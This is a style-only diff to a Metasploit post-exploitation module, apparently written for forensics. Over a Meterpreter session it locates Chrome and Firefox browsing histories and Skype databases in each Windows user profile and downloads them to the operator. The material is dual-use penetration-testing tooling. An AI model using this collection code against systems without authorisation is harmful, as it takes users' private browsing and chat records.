@@ -23,7 +23,7 @@ class MetasploitModule < Msf::Post
         'Author' => [
           'Joshua Harper <josh[at]radixtx.com>' # @JonValt
         ],
-        'Platform' => %w{win},
+        'Platform' => %w[win],
         'SessionTypes' => [ 'meterpreter' ],
         'Compat' => {
           'Meterpreter' => {
@@ -46,13 +46,13 @@ class MetasploitModule < Msf::Post
   # Execute the module.
   #
   def run
-    print_status("Gathering user profiles")
+    print_status('Gathering user profiles')
 
     files_to_gather = [
-      { :path => 'LocalAppData', :name => "Chrome History", :dir => "Google", :fname => "History." },
-      { :path => 'LocalAppData', :name => "Chrome Archived History", :dir => "Google", :fname => "Archived History." },
-      { :path => 'AppData', :name => 'Skype', :dir => 'Skype', :fname => "main.db" },
-      { :path => 'AppData', :name => "Firefox", :dir => "Mozilla", :fname => "places.sqlite" }
+      { path: 'LocalAppData', name: 'Chrome History', dir: 'Google', fname: 'History.' },
+      { path: 'LocalAppData', name: 'Chrome Archived History', dir: 'Google', fname: 'Archived History.' },
+      { path: 'AppData', name: 'Skype', dir: 'Skype', fname: 'main.db' },
+      { path: 'AppData', name: 'Firefox', dir: 'Mozilla', fname: 'places.sqlite' }
     ]
 
     grab_user_profiles.each do |userprofile|
@@ -91,7 +91,7 @@ class MetasploitModule < Msf::Post
     path = opts[:path]
 
     artifact_path = "#{profile[path]}\\#{dir}"
-    file = session.fs.file.search(artifact_path, "#{fname}", true)
+    file = session.fs.file.search(artifact_path, fname.to_s, true)
 
     return false unless file
 
@@ -99,7 +99,7 @@ class MetasploitModule < Msf::Post
       guid = db['path'].split('\\')
       # Using store_local for full control of output filename. Forensics software can be picky about the files it's given.
       local_loc = "#{profile['UserName']}_#{name}_#{guid.last}_#{fname}"
-      file_loc = store_local("artifact", STORE_FILE_TYPE, session, local_loc)
+      file_loc = store_local('artifact', STORE_FILE_TYPE, session, local_loc)
       maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
       print_status("Downloading #{maindb}")
       session.fs.file.download_file(file_loc, maindb)
